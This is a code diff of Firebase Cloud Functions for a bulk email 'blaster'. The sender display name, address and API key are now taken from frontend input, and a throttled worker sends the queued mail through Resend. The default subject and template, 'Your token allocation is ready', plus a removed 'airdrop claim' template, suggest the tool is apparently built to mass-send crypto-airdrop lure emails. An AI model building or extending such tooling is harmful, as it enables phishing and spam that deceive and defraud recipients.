@@ -9,21 +9,6 @@ const db = admin.firestore()
 
 /**
  * =========================
- * FETCH DOMAIN CONFIG
- * =========================
- */
-async function getDomainConfig(domain) {
-  const doc = await db.collection('apis').doc(domain).get()
-
-  if (!doc.exists) {
-    throw new Error(`Domain config not found: ${domain}`)
-  }
-
-  return doc.data()
-}
-
-/**
- * =========================
  * GENERATE CAMPAIGN ID
  * =========================
  */
@@ -38,23 +23,17 @@ function generateCampaignId(domain) {
  */
 exports.sendBlaster = onCall(async (request) => {
   try {
-    let {
-      emails,
-      subject,
-      html,
-      domain,
-      from, // 🔥 FRONTEND CONTROLS THIS
-    } = request.data
+    let { emails, subject, html, domain, from, fromEmail, apiKey } = request.data
 
+    // ------------------------
+    // VALIDATION
+    // ------------------------
     if (!domain) {
       throw new HttpsError('invalid-argument', 'Domain is required')
     }
 
-    const config = await getDomainConfig(domain)
-
-    // validate config
-    if (!config.apiKey || !config.fromEmail) {
-      throw new Error('Invalid domain config (missing apiKey or fromEmail)')
+    if (!fromEmail || !apiKey) {
+      throw new HttpsError('invalid-argument', 'Missing fromEmail or apiKey')
     }
 
     if (typeof emails === 'string') {
@@ -77,17 +56,16 @@ exports.sendBlaster = onCall(async (request) => {
       batch.set(ref, {
         email,
         subject: subject || 'Your token allocation is ready',
-        html: buildAirdropClaimHTML(),
+        html: html || buildDefaultEmail(),
 
+        // campaign info
         domain,
         campaignId,
 
-        // 🔥 FRONTEND OVERRIDE (PRIMARY)
+        // sender config (FROM FRONTEND)
         from: from || 'Notification',
-
-        // 🔥 DOMAIN CONFIG SNAPSHOT
-        fromEmail: config.fromEmail,
-        apiKey: config.apiKey,
+        fromEmail,
+        apiKey,
 
         status: 'pending',
         createdAt: admin.firestore.FieldValue.serverTimestamp(),
@@ -100,12 +78,12 @@ exports.sendBlaster = onCall(async (request) => {
 
     return {
       success: true,
+      queued: emails.length,
       campaignId,
       domain,
-      queued: emails.length,
     }
   } catch (err) {
-    console.error(err)
+    console.error('SEND BLASTER ERROR:', err)
     throw new HttpsError('internal', err.message)
   }
 })
@@ -129,14 +107,13 @@ exports.emailWorker = onSchedule('every 1 minutes', async () => {
     const data = doc.data()
 
     try {
+      // create resend instance per job
       const resend = new Resend(data.apiKey)
 
-      const fromName = data.from || 'Notification'
-
       await resend.emails.send({
-        from: `${fromName} <${data.fromEmail}>`,
+        from: `${data.from} <${data.fromEmail}>`,
         to: data.email,
-        subject: data.subject || 'Your token allocation is ready',
+        subject: data.subject,
         html: data.html,
 
         headers: {
@@ -156,11 +133,27 @@ exports.emailWorker = onSchedule('every 1 minutes', async () => {
       })
     }
 
-    // throttling
+    // throttle
     await new Promise((r) => setTimeout(r, 3000))
   }
 })
 
+/**
+ * =========================
+ * DEFAULT EMAIL TEMPLATE
+ * =========================
+ */
+function buildDefaultEmail() {
+  return `
+    <html>
+      <body style="font-family:Arial; padding:20px;">
+        <h2>Your Token Allocation is Ready</h2>
+        <p>Please log in to view your allocation.</p>
+        <a href="https://example.com">Open Dashboard</a>
+      </body>
+    </html>
+  `
+}
 /*========================= EMAIL TEMPLATE (optional default) ========================= */
 
 function buildAirdropClaimHTML() {
